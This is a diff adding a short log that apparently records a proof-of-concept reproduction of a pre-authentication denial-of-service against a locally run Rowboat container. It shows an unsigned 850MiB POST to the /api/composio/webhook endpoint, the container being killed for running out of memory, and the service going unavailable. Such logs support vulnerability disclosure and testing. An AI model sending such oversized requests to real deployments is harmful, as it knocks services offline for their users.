@@ -1,0 +1,8 @@
+[2026-07-11 15:20:29] DOCKER_RUN_ROWBOAT_PREAUTH_BODY_DOS image=production memory_limit=1GiB port=127.0.0.1:3102
+[2026-07-11 15:20:29] TARGET POST /api/composio/webhook unsigned_body=850MiB concurrency=1
+[2026-07-11 15:20:29] BASELINE_GET / status=200
+[2026-07-11 15:20:29] MEMORY_BEFORE 134.8MiB / 1GiB
+[2026-07-11 15:20:39] ATTACK_UNSIGNED_WEBHOOK curl_exit=52 output="curl: (52) Empty reply from server" http_code=100
+[2026-07-11 15:20:43] DOCKER_INSPECT OOMKilled=true ExitCode=137 Status=exited Running=false
+[2026-07-11 15:20:45] POST_ATTACK_GET / error="Failed to connect to 127.0.0.1 port 3102" exit=7
+[2026-07-11 15:20:45] RESULT=REPRODUCED_SERVICE_UNAVAILABLE
